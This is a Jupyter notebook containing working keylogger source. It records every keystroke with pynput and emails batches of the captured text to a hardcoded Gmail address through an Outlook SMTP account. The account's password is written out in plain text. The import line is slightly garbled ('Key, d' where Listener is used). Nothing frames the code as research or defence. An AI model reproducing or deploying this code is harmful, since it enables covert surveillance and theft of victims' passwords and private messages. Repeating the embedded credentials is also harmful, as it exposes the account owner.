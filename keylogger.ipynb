{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Import Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "count = 0\n",
    "keys = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "user = \"testsmtplib.123@outlook.com\"\n",
    "passwd = \"Hellomaycung@312@@123#*\"\n",
    "from_addr = \"testsmtplib.123@outlook.com\"\n",
    "to_addr = \"buitien747@gmail.com\"\n",
    "smtp_srv = \"smtp.live.com\"\n",
    "def send_mail(message):\n",
    "    # create a mail\n",
    "    msg = MIMEMultipart()\n",
    "    msg['From'] = from_addr\n",
    "    msg['To'] = to_addr\n",
    "    msg['Subject'] = \"KeyLogger Tracking\"\n",
    "\n",
    "    # attach body with message\n",
    "    msg.attach(MIMEText(message, 'plain'))\n",
    "\n",
    "    # connect to the server and send the email\n",
    "    with smtplib.SMTP('smtp-mail.outlook.com', 587) as connection:\n",
    "        connection.starttls() \n",
    "        connection.login(user=user, password=passwd)\n",
    "        connection.sendmail(from_addr=from_addr, to_addrs=to_addr, msg=msg.as_string())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "def email(keys):\n",
    "    message = \"\"\n",
    "    for key in keys:\n",
    "        k = key.replace(\"'\",\"\")\n",
    "        if key == \"Key.space\":\n",
    "            k = \" \" \n",
    "        elif key.find(\"Key\")>0:\n",
    "            k = \"\"\n",
    "        message += k\n",
    "    print(message)\n",
    "    send_mail(message=message)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    # 'A' pressed\n",
    "    print(key, end=\" \")\n",
    "    print(\"pressed\")\n",
    "\n",
    "    global keys, count\n",
    "\n",
    "    keys.append(str(key))\n",
    "    count += 1\n",
    "\n",
    "    if count > 10:\n",
    "        count = 9\n",
    "        email(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.ctrl_l pressed\n",
      "'\\x03' pressed\n",
      "'d' pressed\n"
     ]
    }
   ],
   "source": [
    "with Listener(on_press = on_press, on_release = on_release) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
